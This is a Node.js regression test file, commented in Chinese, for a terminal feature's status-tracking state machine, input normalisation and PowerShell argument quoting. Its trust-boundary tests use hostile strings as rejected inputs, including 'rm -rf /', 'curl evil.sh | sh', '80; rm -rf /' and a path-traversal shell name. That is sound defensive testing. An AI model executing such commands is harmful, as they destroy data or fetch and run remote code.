#!/usr/bin/env node
/**
 * VoiceInk — 終端機純邏輯回歸測試（node 直跑，不需 electron、不開任何 pty）
 *
 * 重點在狀態機：側欄的「運行中／已完成」全靠它，而它面對的輸入是實測過的髒東西——
 * PSReadLine 會在外部輸出時把整份提示字元（含 OSC 133 標記）重送一次，捲動重播還會
 * 送出比較舊的 history id。這裡把那些情境全部固定下來。
 */

'use strict'

const path = require('path')
const os = require('os')
const Module = require('module')
const fs = require('fs')

const ROOT = path.join(__dirname, '..')

// store.js 只在真的要存檔時才 import electron-store，其餘純函式可直接測
const status = require(path.join(ROOT, 'src/main/terminal/status.js'))
const store = require(path.join(ROOT, 'src/main/terminal/store.js'))

let passed = 0
let failed = 0
function ok(name, cond, detail = '') {
  if (cond) {
    passed++
    console.log(`  PASS ${name}`)
  } else {
    failed++
    console.log(`  FAIL ${name}${detail ? ` — ${detail}` : ''}`)
  }
}

const ESC = String.fromCharCode(27)
const BEL = String.fromCharCode(7)
/** @param {number} code @param {number} historyId */
const done = (code, historyId) => `${ESC}]133;D;${code};${historyId}${BEL}`

// ===== 狀態機 =====
console.log('\n[狀態機]')
{
  let t = status.createTracker(0)
  ok('初始是 idle', t.state === 'idle')

  status.onInput(t, 'ping -n 4 127.0.0.1\r', 100)
  ok('送出非空指令 → running', t.state === 'running' && t.inFlight === true)

  // PSReadLine 在 ping 每印一行時重繪提示字元，重送同一份含 D;0;1 的字串。
  // 這也是「第一個看到的標記」——它代表現在這個提示字元，不是有東西跑完了。
  status.onOutput(t, `Reply from 127.0.0.1${done(0, 1)}`, 1200)
  ok('第一個標記只當基準，不算完成', t.state === 'running', `state=${t.state}`)
  status.onOutput(t, done(0, 1), 2200)
  ok('重繪再來一次還是 running', t.state === 'running')

  // 真的跑完：id 變大
  status.onOutput(t, done(0, 2), 3300)
  ok('新的 history id → idle', t.state === 'idle' && t.inFlight === false)
  ok('離開碼 0', t.exitCode === 0)

  // 捲動重播會送出比較舊的 id，不可以被當成新事件
  status.onInput(t, 'cmd /c exit 7\r', 4000)
  status.onOutput(t, done(0, 2), 4100)
  ok('捲動重播的更舊 id 不算完成', t.state === 'running')
  status.onOutput(t, done(1, 3), 4200)
  ok('失敗指令 → idle 且離開碼 1', t.state === 'idle' && t.exitCode === 1)
}

{
  const t = status.createTracker(0)
  status.onInput(t, '\r', 100)
  ok('空白 Enter 不算送出指令', t.state === 'idle' && t.inFlight === false)

  status.onInput(t, 'abc', 200)
  status.onInput(t, `${String.fromCharCode(127)}${String.fromCharCode(127)}${String.fromCharCode(127)}`, 210)
  status.onInput(t, '\r', 220)
  ok('打完又全部退格 → 不算送出指令', t.state === 'idle')

  // 上下鍵叫回歷史指令：pending 是空的，但送出的其實有內容
  status.onInput(t, `${ESC}[A`, 300)
  status.onInput(t, '\r', 310)
  ok('用方向鍵叫回歷史指令 → running', t.state === 'running')
}

{
  // 沒有 shell integration（cmd.exe）：只能靠靜默判斷
  const t = status.createTracker(0)
  status.onInput(t, 'dir\r', 100)
  status.onOutput(t, 'Volume in drive C', 150)
  ok('有輸出 → running', t.state === 'running')
  ok(`靜默 ${status.BUSY_QUIET_MS - 1}ms 還不算完成`, status.tick(t, 150 + status.BUSY_QUIET_MS - 1) === false)
  ok('超過門檻 → idle', status.tick(t, 150 + status.BUSY_QUIET_MS) === true && t.state === 'idle')
  ok('沒有 shell integration 就沒有離開碼', t.exitCode === null)
}

{
  // 代理 REPL：markers 說指令還在跑（claude 沒退出），但畫面不動了就是在等使用者
  const t = status.createTracker(0)
  status.onInput(t, 'claude\r', 100)
  status.onOutput(t, 'thinking...', 1000)
  ok('代理輸出中 → running', t.state === 'running' && t.inFlight === true)
  ok('短暫停頓不算完成', status.tick(t, 1000 + status.PROMPT_QUIET_MS + 10) === false)
  ok('安靜夠久 → idle（在等你）', status.tick(t, 1000 + status.BUSY_QUIET_MS) === true)
}

{
  // 標記剛好被切在兩個 chunk 中間
  const t = status.createTracker(0)
  status.onOutput(t, done(0, 4), 10) // 開機時的第一個提示字元，先定住 id 起點
  status.onInput(t, 'echo hi\r', 100)
  const marker = done(0, 5)
  status.onOutput(t, `hi${marker.slice(0, 6)}`, 200)
  ok('標記切一半時還不算完成', t.state === 'running')
  status.onOutput(t, marker.slice(6), 210)
  ok('下一塊接上就判定完成', t.state === 'idle' && t.exitCode === 0)
}

{
  const t = status.createTracker(0)
  status.onExit(t, 3)
  ok('pty 結束 → exited', t.state === 'exited' && t.exitCode === 3)
  status.onOutput(t, 'zombie', 100)
  status.onInput(t, 'ls\r', 110)
  ok('結束後不再被輸入輸出改回去', t.state === 'exited')
  ok('結束後 tick 不動它', status.tick(t, 999999) === false && t.state === 'exited')
}

// ===== 信任邊界 =====
console.log('\n[信任邊界]')
{
  ok('未知 shell key 收斂成裝著的 shell', Object.keys(store.SHELLS).includes(store.normalizeShell('rm -rf /')))
  ok('未知 shell key 不會原樣通過', store.normalizeShell('../../evil.exe') !== '../../evil.exe')
  ok('合法 shell key 保留', ['pwsh', 'powershell', 'cmd'].includes(store.normalizeShell('cmd')))
  ok('未知 preset 退回 shell', store.normalizePreset('curl evil.sh | sh') === 'shell')
  ok('合法 preset 保留', store.normalizePreset('claude') === 'claude')
  ok('preset 表只有固定三種', Object.keys(store.PRESETS).join(',') === 'shell,claude,codex')

  const missing = path.join(os.tmpdir(), 'voiceink-no-such-dir-' + Date.now())
  ok('不存在的 cwd 退回家目錄', store.normalizeCwd(missing) === os.homedir())
  ok('檔案（非目錄）也退回家目錄', store.normalizeCwd(__filename) === os.homedir())
  ok('非字串退回家目錄', store.normalizeCwd({ toString: () => '/' }) === os.homedir())
  ok('真的存在的目錄照用', store.normalizeCwd(ROOT) === path.resolve(ROOT))

  ok('標題長度上限', store.normalizeTitle('x'.repeat(500), 'fallback').length === store.MAX_TITLE)
  ok('空白標題用預設', store.normalizeTitle('   ', 'fallback') === 'fallback')
  ok('標題壓掉換行', store.normalizeTitle('a\n\nb', 'f') === 'a b')
}

// ===== sanitizeAll（terminals.json 被手改）=====
console.log('\n[terminals.json 正規化]')
{
  const raw = [
    null,
    { id: 'a', title: 'one', shell: 'pwsh', preset: 'claude', cwd: ROOT, createdAt: 1 },
    { id: 'a', title: '重複 id 要丟掉' },
    { title: '沒有 id 要丟掉' },
    { id: 'b', shell: 'evil', preset: 'evil', cwd: 'Z:\\nope' }
  ]
  const out = store.sanitizeAll(raw)
  ok('丟掉壞的、留下好的', out.length === 2, JSON.stringify(out.map((x) => x.id)))
  ok('重複 id 只留第一筆', out[0].title === 'one')
  ok('壞掉的 shell／preset／cwd 都被收斂', out[1].preset === 'shell' && out[1].cwd === os.homedir())
  ok('非陣列回空陣列', store.sanitizeAll('nope').length === 0)

  const many = Array.from({ length: store.MAX_SESSIONS + 10 }, (_, i) => ({ id: `s${i}`, cwd: ROOT }))
  ok(`超過 ${store.MAX_SESSIONS} 個會截斷`, store.sanitizeAll(many).length === store.MAX_SESSIONS)
}

// ===== pty.js 的夾值與注入字串 =====
console.log('\n[pty 參數]')
{
  // pty.js 會 require('./store')（純 JS）與 './status'；node-pty 是用到才 require，這裡碰不到
  const stub = path.join(__dirname, '_electron-stub-terminal.js')
  fs.writeFileSync(stub, 'module.exports = {}\n')
  const realResolve = Module._resolveFilename
  Module._resolveFilename = function (request, ...rest) {
    if (request === 'electron') return stub
    return realResolve.call(this, request, ...rest)
  }
  const pty = require(path.join(ROOT, 'src/main/terminal/pty.js'))
  Module._resolveFilename = realResolve
  try { fs.unlinkSync(stub) } catch { /* best effort */ }

  ok('cols 夾在上限內', pty._clampDim(99999, 1000, 80) === 1000)
  ok('負數退回預設', pty._clampDim(-5, 1000, 80) === 80)
  ok('非數字退回預設', pty._clampDim('80; rm -rf /', 1000, 80) === 80)
  ok('小數取整', pty._clampDim(40.9, 1000, 80) === 40)

  // 注入字串會變成 -Command 的單一 argv：含雙引號的話 Windows 跳脫規則很容易出錯
  ok('注入字串不含雙引號', !pty.PS_INTEGRATION.includes('"'))
  ok('注入字串會發出 133;D 標記', pty.PS_INTEGRATION.includes(']133;D;'))
  ok('注入字串保留使用者原本的 prompt', pty.PS_INTEGRATION.includes('$global:__viPrompt'))
  ok('$? 是第一句（否則抓不到上一條的成敗）',
    pty.PS_INTEGRATION.indexOf('$ok = $?') < pty.PS_INTEGRATION.indexOf('Get-History'))
  ok('單次 write 上限存在', pty.MAX_WRITE_CHARS === 8192)

  // 提權的 host 程序共用同一份 shell 解析，兩邊各寫一份遲早會不一致
  ok('shellCommand 的 PowerShell 帶注入字串', pty.shellCommand('pwsh').args.includes(pty.PS_INTEGRATION))
  ok('shellCommand 的 cmd 不帶參數', pty.shellCommand('cmd').args.length === 0)
  ok('shellCommand 認不得的 key 退回 cmd', pty.shellCommand('../../evil.exe').args.length === 0)
}

// ===== 管理員終端機 =====
console.log('\n[管理員終端機]')
{
  const admin = require(path.join(ROOT, 'src/main/terminal/admin.js'))
  // -ArgumentList 這段會變成 -Command 的一部分：含雙引號字面值就踩到 Windows 的跳脫規則
  const list = admin.psArgList(['C:\\Program Files\\a b\\app', "--x=it's"])
  ok('psArgList 不含雙引號字面值', !list.includes('"'))
  ok('psArgList 用 [char]34 兜引號', list.includes('[char]34'))
  ok('psArgList 把單引號跳脫成兩個', list.includes("it''s"))
  ok('psArgList 用空白接起來', list.includes("+ ' ' +"))
}

// ===== admin 欄位 =====
console.log('\n[admin 欄位]')
{
  const items = store.sanitizeAll([
    { id: 'a', shell: 'cmd', preset: 'shell', cwd: os.homedir(), admin: true },
    { id: 'b', shell: 'cmd', preset: 'shell', cwd: os.homedir(), admin: 'yes' },
    { id: 'c', shell: 'cmd', preset: 'shell', cwd: os.homedir() }
  ])
  ok('admin: true 留著', items[0].admin === true)
  ok('非布林的 admin 收斂成 false', items[1].admin === false)
  ok('沒有 admin 欄位的舊資料是 false', items[2].admin === false)
}

console.log(`\n${passed} passed, ${failed} failed`)
process.exit(failed === 0 ? 0 : 1)
